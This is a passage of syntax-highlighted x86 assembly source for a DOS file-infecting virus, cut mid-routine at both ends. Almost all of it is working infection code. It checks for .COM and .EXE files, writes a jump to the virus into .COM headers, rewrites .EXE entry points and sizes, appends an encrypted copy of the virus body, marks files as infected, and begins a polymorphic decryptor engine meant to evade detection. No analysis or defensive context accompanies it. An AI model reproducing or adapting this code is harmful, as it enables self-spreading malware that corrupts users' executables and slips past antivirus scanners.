        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_buffer</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc1">;Seek to end of file and get file size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_end</span><span class="sc0">
</span><span class="sc1">;Do not infect too small .exe or .com files</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ok_min_size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">lenvir</span><span class="sc4">+</span><span class="sc2">0410h</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">
</span><span class="sc5">ok_min_size</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Check for .com extension        </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc3">"OC"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_com</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">],</span><span class="sc3">"M"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">inf_com</span><span class="sc0">
</span><span class="sc5">no_com</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Check for .exe mark in file header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Add markers M+Z</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc3">"Z"</span><span class="sc4">+</span><span class="sc3">"M"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">
</span><span class="sc1">;Check for .exe extension        </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc3">"XE"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">],</span><span class="sc3">"E"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">inf_exe</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Exit from file infection</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">exit_inf</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Restore file pointer position</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">system_file</span><span class="sc4">:</span><span class="sc0">          
</span><span class="sc1">;Restore file attribute </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;Restore file open mode</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Do not set file date/time on closing</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc1">;Check if close function</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],(</span><span class="sc2">3Eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_close_file</span><span class="sc0">
</span><span class="sc1">;Close file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc5">no_close_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Infect .COM file</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">inf_com</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Don't infect too big .com files</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc4">-(</span><span class="sc5">lenvir</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">
</span><span class="sc1">;Copy header</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_header</span><span class="sc0">
</span><span class="sc1">;Get file length as entry point</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc1">;Write a jump to virus into header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Set .com marker </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">prog_type</span><span class="sc4">],</span><span class="sc3">"C"</span><span class="sc0">
</span><span class="sc1">;Encrypt and infect</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">get_control</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Infect .EXE file</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">inf_exe</span><span class="sc4">:</span><span class="sc0">       
</span><span class="sc1">;Don't infect Windows programs</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">0040h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">bad_exe</span><span class="sc0">
</span><span class="sc1">;Don't infect overlays</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bad_exe</span><span class="sc0">
</span><span class="sc1">;Check maxmem field</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bad_exe</span><span class="sc0">
</span><span class="sc1">;Save file size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc1">;Page ends on 0200h boundary</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_round_1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">no_round_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_fit_size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">header_ok</span><span class="sc0">
</span><span class="sc5">no_fit_size</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">bad_exe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Exit if cant infect .exe</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">
</span><span class="sc5">header_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_header</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Store new entry point</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Store new stack position</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">lenvir</span><span class="sc4">+</span><span class="sc2">0410h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0FFFEh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc1">;Restore size</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Add virus size to file size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">lenvir</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc1">;Page ends on 0200h boundary</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_round_2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">no_round_2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Store new size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc1">;Set .exe marker </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">prog_type</span><span class="sc4">],</span><span class="sc3">"E"</span><span class="sc0">
</span><span class="sc1">;Encryption an infection continues on next routine</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Encryption and physical infection</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">get_control</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_encrypt</span><span class="sc0">
</span><span class="sc1">;Write virus body to the end of file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">lenvir</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_copy</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_good_write</span><span class="sc0">
</span><span class="sc1">;Seek to beginning of file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_begin</span><span class="sc0">
</span><span class="sc1">;Write new header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0019h</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_buffer</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc1">;Mark file as infected</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc2">1Fh</span><span class="sc0">
</span><span class="sc5">no_good_write</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Jump to infection end</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">        
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Encrypt virus body with variable key and generate a</span><span class="sc0">
</span><span class="sc1">;polymorphic decryptor.</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">do_encrypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc1">;Initialize engine</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_subroutine</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_sub</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_fill_type</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_step_type</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_int_type</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;Choose counter and pointer register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;Choose register for decryption instructions</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_register</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;Chose segment registers for memory operations</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_seg_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_seg_1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_seg_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_seg_2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;Fill our buffer with garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_copy</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">decryptor</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">fill_garbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">fill_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc1">;Now es:di points to the buffer were engine put polymorphic code</span><span class="sc0">
</span><span class="sc5">choose_type</span><span class="sc4">:</span><span class="sc0">       
</span><span class="sc1">;Select the type of filler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">end_step_table</span><span class="sc4">-</span><span class="sc5">step_table</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0"> 
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">
</span><span class="sc1">;Avoid same types in a row</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_step_type</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">choose_type</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_step_type</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">step_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">choose_type</span><span class="sc0">
